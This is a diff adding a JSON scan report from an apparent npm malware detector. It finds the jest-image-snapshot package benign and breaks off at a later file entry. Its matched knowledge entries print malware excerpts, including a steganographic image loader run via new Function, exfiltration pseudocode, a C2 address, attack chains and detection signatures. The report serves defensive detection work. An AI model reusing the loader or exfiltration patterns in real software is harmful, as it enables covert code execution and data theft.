@@ -1,0 +1,1044 @@
+{
+  "package_name": "@morgs32##jest-image-snapshot",
+  "package_version": "2.3.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:15:49.250846",
+  "status": "success",
+  "selected_files_count": 6,
+  "selected_files": [
+    "package/examples/package.json",
+    "package/package.json",
+    "package/src/index.js",
+    "package/examples/jest-setup.js",
+    "package/src/diff-snapshot.js",
+    "package/src/write-result-diff-image.js"
+  ],
+  "is_malicious": false,
+  "total_files": 6,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/examples/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/src/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/examples/jest-setup.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/src/diff-snapshot.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "diff-snapshot_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst childProcess = require('child_process');\nconst pixelmatch = require('pixelmatch');\nconst mkdirp = require('mkdirp');\nconst { PNG } = require('pngjs-nozlib');\n\nfunction diffImageToSnapshot(options) {\n  const {\n    receivedImageBuffer,\n    snapshotIdentifier,\n    snapshotsDir,\n    updateSnapshot = false,\n    customDiffConfig = {},\n    failureThreshold,\n    failureThresholdType,\n  } = options;\n\n  let result = {};\n  const baselineSnapshotPath = path.join(snapshotsDir, `${snapshotIdentifier}-snap.png`);\n  if (fs.existsSync(baselineSnapshotPath) && !updateSnapshot) {\n    const outputDir = path.join(snapshotsDir, '__diff_output__');\n    const diffOutputPath = path.join(outputDir, `${snapshotIdentifier}-diff.png`);\n    const defaultDiffConfig = {\n      threshold: 0.01,\n    };\n\n    const diffConfig = Object.assign({}, defaultDiffConfig, customDiffConfig);\n\n    const receivedImage = PNG.sync.read(receivedImageBuffer);\n    const baselineImage = PNG.sync.read(fs.readFileSync(baselineSnapshotPath));\n\n    if (\n      receivedImage.height !== baselineImage.height || receivedImage.width !== baselineImage.width\n    ) {\n      throw new Error('toMatchImageSnapshot(): Received image size must match baseline snapshot size in order to make comparison.');\n    }\n    const imageWidth = receivedImage.width;\n    const imageHeight = receivedImage.height;\n    const diffImage = new PNG({ width: imageWidth, height: imageHeight });\n\n    const diffPixelCount = pixelmatch(\n      receivedImage.data,\n      baselineImage.data,\n      diffImage.data,\n      imageWidth,\n      imageHeight,\n      diffConfig\n    );\n\n    const totalPixels = imageWidth * imageHeight;\n    const diffRatio = diffPixelCount / totalPixels;\n\n    let pass = false;\n    if (failureThresholdType === 'pixel') {\n      pass = diffPixelCount <= failureThreshold;\n    } else if (failureThresholdType === 'percent') {\n      pass = diffRatio <= failureThreshold;\n    } else {\n      throw new Error(`Unknown failureThresholdType: ${failureThresholdType}. Valid options are \\\"pixel\\\" or \\\"percent\\\".`);\n    }\n\n    if (!pass) {\n      mkdirp.sync(outputDir);\n      const compositeResultImage = new PNG({\n        width: imageWidth * 3,\n        height: imageHeight,\n      });\n      // copy baseline, diff, and received images into composite result image\n      PNG.bitblt(\n        baselineImage, compositeResultImage, 0, 0, imageWidth, imageHeight, 0, 0\n      );\n      PNG.bitblt(\n        diffImage, compositeResultImage, 0, 0, imageWidth, imageHeight, imageWidth, 0\n      );\n      PNG.bitblt(\n        receivedImage, compositeResultImage, 0, 0, imageWidth, imageHeight, imageWidth * 2, 0\n      );\n\n      const input = { imagePath: diffOutputPath, image: compositeResultImage };\n\n      // writing diff in separate process to avoid perf issues associated with Math in Jest VM (https://github.com/facebook/jest/issues/5163)\n      const writeDiffProcess = childProcess.spawnSync('node', [`${__dirname}/write-result-diff-image.js`], { input: Buffer.from(JSON.stringify(input)) });\n      // in case of error print to console\n      if (writeDiffProcess.stderr.toString()) { console.log(writeDiffProcess.stderr.toString()); } // eslint-disable-line no-console, max-len\n    }\n\n    result = {\n      pass,\n      diffOutputPath,\n      diffRatio,\n      diffPixelCount,\n    };\n  } else {\n    mkdirp.sync(snapshotsDir);\n    fs.writeFileSync(baselineSnapshotPath, receivedImageBuffer);\n\n    result = updateSnapshot ? { updated: true } : { added: true };\n  }\n  return result;\n}\n\nmodule.exports = {\n  diffImageToSnapshot,\n};",
+          "is_malicious": false,
+          "malice_score": 0.4856282234191895,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and reads image snapshot files from the filesystem using fs and path modules, compares the received image buffer with a baseline snapshot using pixelmatch, and conditionally writes diff images to disk. It also spawns a child process to write the diff image asynchronously using child_process.spawnSync. This behavior involves file read/write operations and process execution without any network activity or suspicious hardcoded data, facilitating image snapshot comparison and diff generation.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate utility function designed for image snapshot comparison in testing environments. It reads baseline snapshot images from disk, compares them pixel-by-pixel with received images using the pixelmatch library, and conditionally writes diff images to disk. It also spawns a child process to asynchronously write the diff image to avoid performance issues. There is no evidence of network activity, unauthorized data capture, or exfiltration. The code does not use any suspicious modules like screenshot-desktop or node-webcam, nor does it attempt to capture images from the system or webcam. The child process spawned runs a local script for image writing, not a remote command or data exfiltration. Compared to the known malicious patterns, which involve silent capture of screenshots or webcam images and network exfiltration, this code is purely focused on image diffing for snapshot testing. Therefore, it is benign.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113708_595271_snippet_2",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113708_595271/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5111647248268127,
+              "code_similarity": 0.48901689052581787,
+              "behavior_similarity": 0.5333125591278076,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Example pseudo-code\nconst screenshot = require('screenshot-desktop');\nscreenshot().then((img) => {\n  // send img to remote server\n});\n\nconst NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // send data to remote server\n});",
+                "code_behavior": "At runtime, the code captures screenshots and webcam images using system APIs or npm modules, then exfiltrates the captured media to a remote server via network requests, resulting in unauthorized surveillance.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the screen and camera without user consent and sending the data externally is a hallmark of spyware and privacy violation.",
+                  "violated_expectations": "Normal npm packages should not access or exfiltrate screen or camera data unless explicitly designed for such purposes with user awareness and consent.",
+                  "similar_legitimate_use": "Video conferencing or screenshot tools may access these resources, but only with user consent and without silent exfiltration to unknown servers.",
+                  "key_indicators": [
+                    "Use of screenshot-desktop or node-webcam modules for image capture",
+                    "Silent capture of screenshots or webcam images without user notification",
+                    "Network exfiltration of image data to remote servers",
+                    "Absence of user prompts or consent dialogs for camera/screen access"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main JavaScript file or auxiliary modules",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "camera",
+                    "screen",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is considered malicious because it abuses a legitimate password-recovery tool (ChromePass) to steal credentials from Google Chrome, and provides additional capabilities such as unauthorized screen and camera access, directory enumeration, and remote shell command execution. These behaviors are not expected in legitimate npm packages and indicate clear intent to exfiltrate sensitive user data and enable remote control of the victim's system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed on the victim's system.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code at runtime"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At runtime, the package executes ChromePass.exe to extract Chrome passwords and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package captures screenshots and webcam images, then exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and privacy violation"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package lists directories on the victim's filesystem and sends the information to a remote server.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Reconnaissance for further exploitation"
+                  },
+                  {
+                    "step": 5,
+                    "action": "The package enables remote shell command execution, allowing attackers to control the victim's system and maintain persistence.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Full remote compromise and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or similar credential extraction tools from within npm packages",
+                    "Silent screenshot or webcam capture using screenshot-desktop or node-webcam modules followed by network exfiltration",
+                    "Automated directory listing of user or system directories and exfiltration of file lists",
+                    "Remote command execution via child_process.exec or similar APIs, especially when commands originate from network sources"
+                  ],
+                  "file_indicators": [
+                    "Bundled or downloaded ChromePass.exe binary within the package directory",
+                    "Creation of temporary files such as passwords.txt in user-accessible directories",
+                    "Unusual or unauthorized use of screenshot-desktop or node-webcam modules in non-UI npm packages"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known command-and-control or exfiltration domains immediately after package installation or execution",
+                    "HTTP POST requests containing credential dumps, screenshots, webcam images, or directory listings",
+                    "Unusual network traffic patterns from node.js processes, especially following execution of external binaries or system commands"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that execute external binaries such as ChromePass.exe, access camera or screen APIs, or perform directory listing and exfiltration. Flag packages that initiate outbound network connections immediately after installation or at runtime, especially those sending sensitive files, images, or command outputs. Use endpoint security tools to detect suspicious process execution and network activity originating from node.js processes, and correlate with the presence of bundled binaries or unauthorized use of system resources."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171940_736614_snippet_2",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171940_736614/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.49649855494499207,
+              "code_similarity": 0.4838207960128784,
+              "behavior_similarity": 0.5091763138771057,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const screenshot = require('screenshot-desktop');\nscreenshot().then((img) => {\n  // exfiltrate img buffer\n});",
+                "code_behavior": "At runtime, the code captures a screenshot of the user's desktop using screenshot-desktop, saves the image buffer, and exfiltrates the image data to a remote server, enabling unauthorized surveillance.",
+                "malice_analysis": {
+                  "why_suspicious": "Capturing and exfiltrating screenshots without user knowledge is a common tactic for surveillance, espionage, and data theft.",
+                  "violated_expectations": "Normal npm packages should not access the user's screen or exfiltrate images without explicit user consent and awareness.",
+                  "similar_legitimate_use": "Screen-sharing or remote support tools may capture screenshots, but only with user awareness and explicit permission.",
+                  "key_indicators": [
+                    "Use of screenshot-desktop or similar screen capture modules",
+                    "Automated screenshot capture without user interaction",
+                    "Network exfiltration of image buffers or screenshot files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main application file or a helper module",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "camera",
+                    "screen"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is malicious because it abuses ChromePass, a legitimate password-recovery tool for Google Chrome, to steal user credentials. It also provides advanced surveillance and system compromise capabilities, including unauthorized access to the user's screen, webcam, filesystem, and shell, with automated exfiltration of sensitive data to remote servers. These behaviors are highly indicative of malware and pose significant privacy and security risks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or runs the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code executes at runtime."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malware executes ChromePass to extract Chrome passwords and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware captures screenshots and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and data theft."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware activates webcam, captures images, and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Surveillance and privacy violation."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malware lists user directories and exfiltrates directory listings.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Reconnaissance for further attacks."
+                  },
+                  {
+                    "step": 6,
+                    "action": "Malware executes arbitrary shell commands and exfiltrates the results.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Full system compromise and persistent access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or other credential extraction tools from within npm package code",
+                    "Unusual access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop) without user interaction",
+                    "Automated directory listing of user or system folders followed by network exfiltration",
+                    "Remote shell command execution via child_process.exec or similar APIs with exfiltration of outputs"
+                  ],
+                  "file_indicators": [
+                    "Presence of ChromePass.exe bundled or downloaded in the package directory",
+                    "Creation of temporary files such as passwords.txt or screenshot images in user directories",
+                    "Unexpected image files (e.g., test_picture.jpg) or directory listings in temporary or user folders"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to unknown or suspicious remote servers immediately after credential, image, or directory data is generated",
+                    "Exfiltration of credential files (e.g., passwords.txt), screenshots, webcam images, or command outputs via HTTP, HTTPS, or other protocols"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of external tools like ChromePass.exe, access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop), and unexpected network activity following sensitive data access. Flag packages that attempt to exfiltrate files, images, or command outputs. Scan for bundled binaries such as ChromePass.exe and temporary files like passwords.txt or screenshot images in user directories. Use endpoint protection to detect suspicious child_process executions, automated directory listings, and network exfiltration attempts. Correlate behavioral, file, and network indicators to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171940_736614_snippet_3",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171940_736614/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4622487723827362,
+              "code_similarity": 0.4189448952674866,
+              "behavior_similarity": 0.5055526494979858,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const NodeWebcam = require('node-webcam');\nNodeWebcam.capture('test_picture', {}, function(err, data) {\n  // exfiltrate data\n});",
+                "code_behavior": "At runtime, the code activates the user's webcam using node-webcam, captures an image, and exfiltrates the photo data to a remote server, resulting in a privacy violation.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing the webcam and sending images externally without user consent is a hallmark of spyware and a severe privacy violation.",
+                  "violated_expectations": "Legitimate npm packages should not access the webcam or exfiltrate images without explicit user consent and notification.",
+                  "similar_legitimate_use": "Video conferencing or camera applications may access the webcam, but only with user permission and clear indication.",
+                  "key_indicators": [
+                    "Use of node-webcam or similar webcam access modules",
+                    "Automated webcam activation and image capture",
+                    "Network exfiltration of webcam images or video data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main application file or a helper module",
+                  "required_permissions": [
+                    "camera",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is malicious because it abuses ChromePass, a legitimate password-recovery tool for Google Chrome, to steal user credentials. It also provides advanced surveillance and system compromise capabilities, including unauthorized access to the user's screen, webcam, filesystem, and shell, with automated exfiltration of sensitive data to remote servers. These behaviors are highly indicative of malware and pose significant privacy and security risks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or runs the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code executes at runtime."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malware executes ChromePass to extract Chrome passwords and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware captures screenshots and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and data theft."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware activates webcam, captures images, and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Surveillance and privacy violation."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malware lists user directories and exfiltrates directory listings.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Reconnaissance for further attacks."
+                  },
+                  {
+                    "step": 6,
+                    "action": "Malware executes arbitrary shell commands and exfiltrates the results.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Full system compromise and persistent access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or other credential extraction tools from within npm package code",
+                    "Unusual access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop) without user interaction",
+                    "Automated directory listing of user or system folders followed by network exfiltration",
+                    "Remote shell command execution via child_process.exec or similar APIs with exfiltration of outputs"
+                  ],
+                  "file_indicators": [
+                    "Presence of ChromePass.exe bundled or downloaded in the package directory",
+                    "Creation of temporary files such as passwords.txt or screenshot images in user directories",
+                    "Unexpected image files (e.g., test_picture.jpg) or directory listings in temporary or user folders"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to unknown or suspicious remote servers immediately after credential, image, or directory data is generated",
+                    "Exfiltration of credential files (e.g., passwords.txt), screenshots, webcam images, or command outputs via HTTP, HTTPS, or other protocols"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of external tools like ChromePass.exe, access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop), and unexpected network activity following sensitive data access. Flag packages that attempt to exfiltrate files, images, or command outputs. Scan for bundled binaries such as ChromePass.exe and temporary files like passwords.txt or screenshot images in user directories. Use endpoint protection to detect suspicious child_process executions, automated directory listings, and network exfiltration attempts. Correlate behavioral, file, and network indicators to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202033_905711_snippet_2",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4529224634170532,
+              "code_similarity": 0.4811527132987976,
+              "behavior_similarity": 0.42469218373298645,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function processImage(filePath) {\n    console.log(\"Processing image...\");\n    const data = fs.readFileSync(filePath);\n    let analyzepixels = \"\";\n    let convertertree = false;\n\n    for (let i = 0; i < data.length; i++) {\n        const value = data[i];\n        if (value >= 32 && value <= 126) {\n            analyzepixels += String.fromCharCode(value);\n        } else {\n            if (analyzepixels.length > 2000) {\n                convertertree = true;\n                break;\n            }\n            analyzepixels = \"\";\n        }\n    }\n    // ...\n    if (convertertree) {\n        imagebyte = analyzepixels;\n    } else {\n        // benign code\n    }\n    const func = new Function('https', 'exec', 'os', imagebyte);\n    func(https, exec, os);\n}\nprocessImage('logo1.jpg');\nprocessImage('logo2.jpg');\nprocessImage('logo3.jpg');",
+                "code_behavior": "During postinstall, the code reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads from their byte data, and if a threshold is met, dynamically executes the extracted string as JavaScript code, resulting in arbitrary code execution sourced from image-embedded payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files.",
+                  "violated_expectations": "Legitimate packages do not extract and execute code from image files during installation, nor do they use dynamic code execution on data sourced from non-code files.",
+                  "similar_legitimate_use": "Legitimate image processing libraries may read and analyze image files, but never execute dynamically extracted code from image data.",
+                  "key_indicators": [
+                    "Steganographic payload extraction from image files",
+                    "Dynamic code execution using new Function() on extracted strings",
+                    "Threshold-based trigger for code execution (payload length > 2000)",
+                    "References to analyzepixels, convertertree, and imagebyte variables"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "dist/loadformat.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133830_348434_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants) (NSIS installer (Electron app bundle))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133830_348434/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45001426339149475,
+              "code_similarity": 0.42962026596069336,
+              "behavior_similarity": 0.47040826082229614,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst fs = require('fs');\nconst os = require('os');\nconst browserData = getBrowserData();\nconst credentials = getCredentials();\nconst systemInfo = getSystemInfo();\nconst payload = { browserData, credentials, systemInfo };\n\nuploadToGofile(payload);",
+                "code_behavior": "At runtime, after installation and on app launch, the code uses Node.js APIs to collect system information, browser histories, and credentials from the victim's machine, packages this data, and sends it via network requests to the gofile file-sharing service, resulting in exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically harvests sensitive user data (system info, browser histories, credentials) and exfiltrates it to an external file-sharing service (gofile.io), which is a hallmark of infostealer malware.",
+                  "violated_expectations": "A legitimate Electron application should not access or transmit browser histories, credentials, or system information without explicit user consent, nor should it upload such data to anonymous third-party file-sharing services.",
+                  "similar_legitimate_use": "Some legitimate diagnostic or support tools may collect system information for troubleshooting, but they do not access browser credentials or upload sensitive data to anonymous file-sharing services.",
+                  "key_indicators": [
+                    "Access to browser data and credential stores via Node.js APIs",
+                    "Collection of system information using Node.js modules (e.g., os, fs)",
+                    "Network exfiltration to gofile.io or similar file-sharing domains",
+                    "Malicious logic embedded in Electron app's asar archive (e.g., a.js)",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, after installation and on app launch",
+                  "file_location": "app\\resources\\app.asar > a.js (Node.js script inside Electron app bundle)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants)",
+                  "package_manager": "NSIS installer (Electron app bundle)",
+                  "package_versions": "Unknown (malicious samples: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "The entire package is malicious because it masquerades as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe), but actually installs and executes an Electron-based infostealer. The malware leverages Node.js capabilities within the Electron framework to harvest sensitive data such as system information, browser histories, and credentials, and exfiltrates this data to external file-sharing services like gofile.io. The use of NSIS installers and Electron's asar archive structure is intended to evade detection and facilitate stealthy data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and runs the NSIS installer masquerading as legitimate software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Installation and execution of the bundled Electron app."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NSIS installer executes the Electron app, which loads the malicious Node.js code from the asar archive.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code execution within the Electron app context."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects sensitive data (system information, browser histories, credentials) from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of harvested data for exfiltration."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to the gofile file-sharing service via network requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data, achieving the final objective of data theft."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser data and credentials via Node.js APIs shortly after installation or first run",
+                    "Network connections to file-sharing services (e.g., gofile.io) initiated by Electron-based applications",
+                    "Electron apps bundled in NSIS installers that immediately execute the main app post-installation",
+                    "Absence of user notification or consent for data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.asar archive containing suspicious Node.js scripts (e.g., a.js) within Electron app resources",
+                    "NSIS installer files with names mimicking popular software (e.g., TeamViewer.exe, BetterShaders Setup 1.0.3.exe, Software.exe)",
+                    "Electron app bundles with embedded scripts referencing credential or browser data APIs"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to gofile.io or similar file-sharing domains from Electron app processes",
+                    "Unusual POST requests containing system, browser, or credential data to external file-sharing services",
+                    "Network activity from newly installed Electron apps to non-standard domains immediately after installation"
+                  ],
+                  "how_to_detect": "Monitor for Electron-based applications that, upon installation or first run, access browser credential stores, system information, or user data, and then initiate outbound connections to file-sharing or data exfiltration services such as gofile.io. Inspect Electron app asar archives for Node.js scripts that reference credential or browser data APIs. Flag NSIS installers that immediately execute bundled Electron apps, especially if the app is not from a verified publisher or is distributed outside official channels. Correlate file, process, and network activity to identify infostealer behavior patterns."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@morgs32##jest-image-snapshot/2.3.1/package/src/write-result-diff-image.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
